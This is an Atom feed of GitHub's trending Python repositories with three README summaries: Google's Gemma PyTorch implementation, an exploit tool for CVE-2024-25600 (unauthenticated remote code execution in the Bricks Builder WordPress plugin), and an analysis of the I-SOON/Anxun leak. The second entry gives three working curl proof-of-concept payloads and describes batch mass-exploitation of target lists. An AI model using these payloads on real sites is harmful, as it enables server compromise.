<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-02-24T01:31:45Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>google/gemma_pytorch</title>
    <updated>2024-02-24T01:31:45Z</updated>
    <id>tag:github.com,2024-02-24:/google/gemma_pytorch</id>
    <link href="https://github.com/google/gemma_pytorch" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The official PyTorch implementation of Google&#39;s Gemma models&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Gemma in PyTorch&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;Gemma&lt;/strong&gt; is a family of lightweight, state-of-the art open models built from research and technology used to create Google Gemini models. They are text-to-text, decoder-only large language models, available in English, with open weights, pre-trained variants, and instruction-tuned variants. For more details, please check out the following links:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ai.google.dev/gemma&#34;&gt;Gemma on Google AI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kaggle.com/models/google/gemma&#34;&gt;Gemma on Kaggle&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/335&#34;&gt;Gemma on Vertex AI Model Garden&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This is the official PyTorch implementation of Gemma models. We provide model and inference implementations using both PyTorch and PyTorch/XLA, and support running inference on CPU, GPU and TPU.&lt;/p&gt; &#xA;&lt;h2&gt;Download Gemma model checkpoint&lt;/h2&gt; &#xA;&lt;p&gt;You can find the model checkpoints on Kaggle &lt;a href=&#34;https://www.kaggle.com/models/google/gemma/frameworks/pyTorch&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Note that you can choose between the 2B, 7B, 7B int8 quantized variants.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;VARIANT=&amp;lt;2b or 7b&amp;gt;&#xA;CKPT_PATH=&amp;lt;Insert ckpt path here&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Try it free on Colab&lt;/h2&gt; &#xA;&lt;p&gt;Follow the steps at &lt;a href=&#34;https://ai.google.dev/gemma/docs/pytorch_gemma&#34;&gt;https://ai.google.dev/gemma/docs/pytorch_gemma&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Try it out with PyTorch&lt;/h2&gt; &#xA;&lt;p&gt;Prerequisite: make sure you have setup docker permission properly as a non-root user.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo usermod -aG docker $USER&#xA;newgrp docker&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Build the docker image.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;DOCKER_URI=gemma:${USER}&#xA;&#xA;docker build -f docker/Dockerfile ./ -t ${DOCKER_URI}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run Gemma inference on CPU.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PROMPT=&#34;The meaning of life is&#34;&#xA;&#xA;docker run -t --rm \&#xA;    -v ${CKPT_PATH}:/tmp/ckpt \&#xA;    ${DOCKER_URI} \&#xA;    python scripts/run.py \&#xA;    --ckpt=/tmp/ckpt \&#xA;    --variant=&#34;${VARIANT}&#34; \&#xA;    --prompt=&#34;${PROMPT}&#34;&#xA;    # add `--quant` for the int8 quantized model.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run Gemma inference on GPU.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PROMPT=&#34;The meaning of life is&#34;&#xA;&#xA;docker run -t --rm \&#xA;    --gpus all \&#xA;    -v ${CKPT_PATH}:/tmp/ckpt \&#xA;    ${DOCKER_URI} \&#xA;    python scripts/run.py \&#xA;    --device=cuda \&#xA;    --ckpt=/tmp/ckpt \&#xA;    --variant=&#34;${VARIANT}&#34; \&#xA;    --prompt=&#34;${PROMPT}&#34;&#xA;    # add `--quant` for the int8 quantized model.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Try It out with PyTorch/XLA&lt;/h2&gt; &#xA;&lt;h3&gt;Build the docker image (CPU, TPU).&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;DOCKER_URI=gemma_xla:${USER}&#xA;&#xA;docker build -f docker/xla.Dockerfile ./ -t ${DOCKER_URI}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Build the docker image (GPU).&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;DOCKER_URI=gemma_xla_gpu:${USER}&#xA;&#xA;docker build -f docker/xla_gpu.Dockerfile ./ -t ${DOCKER_URI}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run Gemma inference on CPU.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker run -t --rm \&#xA;    --shm-size 4gb \&#xA;    -e PJRT_DEVICE=CPU \&#xA;    -v ${CKPT_PATH}:/tmp/ckpt \&#xA;    ${DOCKER_URI} \&#xA;    python scripts/run_xla.py \&#xA;    --ckpt=/tmp/ckpt \&#xA;    --variant=&#34;${VARIANT}&#34; \&#xA;    # add `--quant` for the int8 quantized model.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run Gemma inference on TPU.&lt;/h3&gt; &#xA;&lt;p&gt;Note: be sure to use the docker container built from &lt;code&gt;xla.Dockerfile&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker run -t --rm \&#xA;    --shm-size 4gb \&#xA;    -e PJRT_DEVICE=TPU \&#xA;    -v ${CKPT_PATH}:/tmp/ckpt \&#xA;    ${DOCKER_URI} \&#xA;    python scripts/run_xla.py \&#xA;    --ckpt=/tmp/ckpt \&#xA;    --variant=&#34;${VARIANT}&#34; \&#xA;    # add `--quant` for the int8 quantized model.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run Gemma inference on GPU.&lt;/h3&gt; &#xA;&lt;p&gt;Note: be sure to use the docker container built from &lt;code&gt;xla_gpu.Dockerfile&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker run -t --rm --privileged \&#xA;    --shm-size=16g --net=host --gpus all \&#xA;    -e USE_CUDA=1 \&#xA;    -e PJRT_DEVICE=CUDA \&#xA;    -v ${CKPT_PATH}:/tmp/ckpt \&#xA;    ${DOCKER_URI} \&#xA;    python scripts/run_xla.py \&#xA;    --ckpt=/tmp/ckpt \&#xA;    --variant=&#34;${VARIANT}&#34; \&#xA;    # add `--quant` for the int8 quantized model.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This is not an officially supported Google product.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Chocapikk/CVE-2024-25600</title>
    <updated>2024-02-24T01:31:45Z</updated>
    <id>tag:github.com,2024-02-24:/Chocapikk/CVE-2024-25600</id>
    <link href="https://github.com/Chocapikk/CVE-2024-25600" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Unauthenticated Remote Code Execution ‚Äì Bricks &lt;= 1.9.6&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2024-25600 Exploit Tool üöÄ&lt;/h1&gt; &#xA;&lt;h2&gt;Description üìù&lt;/h2&gt; &#xA;&lt;p&gt;This tool üõ†Ô∏è is designed to exploit the CVE-2024-25600 vulnerability üï≥Ô∏è found in the Bricks Builder plugin for WordPress. The vulnerability allows for unauthenticated remote code execution on affected websites üíª. The tool automates the exploitation process by retrieving nonces and sending specially crafted requests to execute arbitrary commands.&lt;/p&gt; &#xA;&lt;h2&gt;Features üåü&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Interactive Mode&lt;/strong&gt;: Engage with the target website in real-time üïπÔ∏è.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Batch Mode&lt;/strong&gt;: Scan and exploit multiple websites from a list üìã.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Command Execution&lt;/strong&gt;: Execute arbitrary commands on the target server ‚öôÔ∏è.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Payload Customization&lt;/strong&gt;: Choose between different payloads for exploitation (carousel or container) üß∞.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;RCE Confirmation&lt;/strong&gt;: Option to display and record only URLs where RCE is confirmed ‚úîÔ∏è.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation üõ†Ô∏è&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Clone this repository to your local machine üñ•Ô∏è using &lt;code&gt;git clone&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Navigate to the directory of the cloned repository.&lt;/li&gt; &#xA; &lt;li&gt;Install the required Python libraries using &lt;code&gt;pip install -r requirements.txt&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Usage üìñ&lt;/h2&gt; &#xA;&lt;h3&gt;Interactive Mode üéÆ&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Run the tool with &lt;code&gt;python exploit.py -u &amp;lt;URL&amp;gt;&lt;/code&gt; to start interactive mode.&lt;/li&gt; &#xA; &lt;li&gt;Follow the on-screen prompts to send commands to the target server.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Batch Mode üìä&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Prepare a text file with a list of target URLs.&lt;/li&gt; &#xA; &lt;li&gt;Run the tool with &lt;code&gt;python exploit.py -l &amp;lt;file_path&amp;gt;&lt;/code&gt; to scan and exploit the listed sites.&lt;/li&gt; &#xA; &lt;li&gt;Use the &lt;code&gt;--only-rce&lt;/code&gt; flag to display and record only URLs where RCE is confirmed.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Payload Customization üß∞&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Use the &lt;code&gt;--payload-type&lt;/code&gt; option followed by &lt;code&gt;generic&lt;/code&gt;, &lt;code&gt;carousel&lt;/code&gt; or &lt;code&gt;container&lt;/code&gt; to specify the type of payload for the exploit.&lt;/p&gt; &lt;p&gt;Example: &lt;code&gt;python exploit.py -u &amp;lt;URL&amp;gt; --payload-type generic&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Proof of Concept (PoC) üìù&lt;/h2&gt; &#xA;&lt;p&gt;The base PoC provided by the disclosure is as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \&#xA;-H &#34;Content-Type: application/json&#34; \&#xA;-d &#39;{&#xA;  &#34;postId&#34;: &#34;1&#34;,&#xA;  &#34;nonce&#34;: &#34;[NONCE]&#34;,&#xA;  &#34;element&#34;: {&#xA;    &#34;name&#34;: &#34;container&#34;,&#xA;    &#34;settings&#34;: {&#xA;      &#34;hasLoop&#34;: &#34;true&#34;,&#xA;      &#34;query&#34;: {&#xA;        &#34;useQueryEditor&#34;: true,&#xA;        &#34;queryEditor&#34;: &#34;throw new Exception(`id`);&#34;,&#xA;        &#34;objectType&#34;: &#34;post&#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Second PoC&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \&#xA;  -H &#34;Content-Type: application/json&#34; \&#xA;  -d &#39;{&#xA;  &#34;postId&#34;: &#34;1&#34;,&#xA;  &#34;nonce&#34;: &#34;[NONCE]&#34;,&#xA;  &#34;element&#34;: {&#xA;    &#34;name&#34;: &#34;carousel&#34;,&#xA;    &#34;settings&#34;: {&#xA;      &#34;type&#34;: &#34;posts&#34;,&#xA;      &#34;query&#34;: {&#xA;        &#34;useQueryEditor&#34;: true,&#xA;        &#34;queryEditor&#34;: &#34;throw new Exception(`id`);&#34;,&#xA;        &#34;objectType&#34;: &#34;post&#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Third PoC &lt;a href=&#34;https://www.linkedin.com/feed/update/urn:li:activity:7166462514099130368&#34;&gt;Source&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \&#xA;  -H &#34;Content-Type: application/json&#34; \&#xA;  -d &#39;{&#xA;  &#34;postId&#34;: &#34;1&#34;,  &#xA;  &#34;nonce&#34;: &#34;[NONCE]&#34;,&#xA;  &#34;element&#34;: &#34;1&#34;,&#xA;  &#34;loopElement&#34;: {&#xA;    &#34;settings&#34;: {&#xA;      &#34;query&#34;: {&#xA;        &#34;useQueryEditor&#34;: &#34;&#34;,&#xA;        &#34;queryEditor&#34;: &#34;throw new Exception(`id`);&#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;It&#39;s possible that additional payloads could yield better results. If my exploit or proof of concept does not work for you, I encourage you to experiment with alternative payloads to find a more effective solution.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Replace &lt;code&gt;[HOST]&lt;/code&gt; with the target website and &lt;code&gt;[NONCE]&lt;/code&gt; with the nonce value retrieved from the site.&lt;/p&gt; &#xA;&lt;h2&gt;Reference üìñ&lt;/h2&gt; &#xA;&lt;p&gt;For more information about the CVE-2024-25600 vulnerability, please refer to the detailed disclosure at &lt;a href=&#34;https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6&#34;&gt;Snicco.io&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer ‚ö†Ô∏è&lt;/h2&gt; &#xA;&lt;p&gt;The information provided in this README is for educational purposes only. Unauthorized hacking into websites or networks is illegal and unethical. üö´&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgements üôè&lt;/h2&gt; &#xA;&lt;p&gt;Kudos to the security researchers who discovered and reported this vulnerability, providing the community with information and tools to help secure their web applications.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>soufianetahiri/Anxun-isoon</title>
    <updated>2024-02-24T01:31:45Z</updated>
    <id>tag:github.com,2024-02-24:/soufianetahiri/Anxun-isoon</id>
    <link href="https://github.com/soufianetahiri/Anxun-isoon" rel="alternate"></link>
    <summary type="html">&lt;p&gt;I-SOON/Anxun leak related stuff&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Original leak&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/I-S00N/I-S00N&#34;&gt;https://github.com/I-S00N/I-S00N&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Anxun-isoon&lt;/h1&gt; &#xA;&lt;p&gt;The iSoon/Anxun leak in a single json file (cn_extracted_messages.json)&lt;/p&gt; &#xA;&lt;h1&gt;What this json tells us:&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The user identified as &lt;code&gt;lengmo&lt;/code&gt; is the top sender, with a total of 4981 messages. This indicates that &lt;code&gt;lengmo&lt;/code&gt; is the most active participant in the conversation.&lt;/li&gt; &#xA; &lt;li&gt;The most frequent communication pair is between &lt;code&gt;lengmo&lt;/code&gt; and &lt;code&gt;Shutd0wn&lt;/code&gt;, with &lt;code&gt;lengmo&lt;/code&gt; sending 4635 messages to &lt;code&gt;Shutd0wn&lt;/code&gt;. This suggests a significant amount of interaction between these two users.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This data implies a strong communication link between &lt;code&gt;lengmo&lt;/code&gt; and &lt;code&gt;Shutd0wn&lt;/code&gt;, potentially indicating a key relationship or hierarchy within the group. &lt;code&gt;lengmo&lt;/code&gt;&#39;s high level of activity could suggest a leadership or central role in the conversation dynamics.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/soufianetahiri/Anxun-isoon/assets/17729335/da21f000-ccce-471c-9fb9-580e821098ee&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;The analysis of working hours by examining the distribution of message times&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0      279&#xA;1      723&#xA;2     1146&#xA;3     1645&#xA;4     1386&#xA;5      843&#xA;6     1415&#xA;7     1167&#xA;8     1538&#xA;9     1430&#xA;10    1025&#xA;11     742&#xA;12     611&#xA;13     708&#xA;14     441&#xA;15     409&#xA;16     140&#xA;17       6&#xA;18       4&#xA;20       1&#xA;21       2&#xA;22      18&#xA;23      64&#xA;Name: hour, dtype: int64&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The distribution of messages per hour shows a pattern that can help infer the working hours. Here&#39;s a summary:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Peak Activity Hours:&lt;/strong&gt; From the early morning hours around 2 AM, increasing to a peak at 3 AM, and then gradually decreasing after 5 AM. There&#39;s another peak starting from 8 AM and extending through 10 AM.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Lower Activity Hours:&lt;/strong&gt; Activity significantly drops after 4 PM, with minimal to no messages after 5 PM.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Initial hot takes&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/DE7AULTsec/status/1759388057323618611&#34;&gt;https://twitter.com/DE7AULTsec/status/1759388057323618611&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://news.risky.biz/risky-biz-briefing-the-i-soon-data-leak&#34;&gt;https://news.risky.biz/risky-biz-briefing-the-i-soon-data-leak&lt;/a&gt;: The i-SOON data also includes files that appear to be documentation or more technical business pitches that describe products of an extremely broad range of capabilities. These include: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Malware designed to run on Windows, macOS, Linux, iOS, and Android;&lt;/li&gt; &#xA;   &lt;li&gt;A platform to collect and analyse email data;&lt;/li&gt; &#xA;   &lt;li&gt;A platform to hack into Outlook accounts;&lt;/li&gt; &#xA;   &lt;li&gt;A Twitter monitoring platform;&lt;/li&gt; &#xA;   &lt;li&gt;An reconnaissance platform using OSINT data;&lt;/li&gt; &#xA;   &lt;li&gt;Physical hardware devices meant to be used for on-premises hacking, typically targeting WiFi networks;&lt;/li&gt; &#xA;   &lt;li&gt;Communications equipment using a Tor-like network for agents working abroad.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.malwarebytes.com/blog/news/2024/02/a-first-analysis-of-the-i-soon-data-leak&#34;&gt;https://www.malwarebytes.com/blog/news/2024/02/a-first-analysis-of-the-i-soon-data-leak&lt;/a&gt;: Some of the tools that i-Soon used are impressive enough. Some highlights: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Twitter (now X) stealer: Features include obtaining the user‚Äôs Twitter email and phone number, real-time monitoring, reading personal messages, and publishing tweets on the user‚Äôs behalf.&lt;/li&gt; &#xA;   &lt;li&gt;Custom Remote Access Trojans (RATs) for Windows x64/x86: Features include process/service/registry management, remote shell, keylogging, file access logging, obtaining system information, disconnecting remotely, and uninstallation.&lt;/li&gt; &#xA;   &lt;li&gt;The iOS version of the RAT also claims to authorize and support all iOS device versions without jailbreaking, with features ranging from hardware information, GPS data, contacts, media files, and real-time audio records as an extension. (Note: this part dates back to 2020)&lt;/li&gt; &#xA;   &lt;li&gt;The Android version can dump messages from all popular Chinese chatting apps QQ, WeChat, Telegram, and MoMo and is capable of elevating the system app for persistence against internal recovery.&lt;/li&gt; &#xA;   &lt;li&gt;Portable devices for attacking networks from the inside.&lt;/li&gt; &#xA;   &lt;li&gt;Special equipment for operatives working abroad to establish safe communication.&lt;/li&gt; &#xA;   &lt;li&gt;User lookup database which lists user data including phone number, name, and email, and can be correlated with social media accounts.&lt;/li&gt; &#xA;   &lt;li&gt;Targeted automatic penetration testing scenario framework.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Initial machine translations&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/soufianetahiri/Anxun-isoon/tree/main/InitialTranslations&#34;&gt;https://github.com/soufianetahiri/Anxun-isoon/tree/main/InitialTranslations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mttaggart/I-S00N/raw/main/README-en.md&#34;&gt;https://github.com/mttaggart/I-S00N/blob/main/README-en.md&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>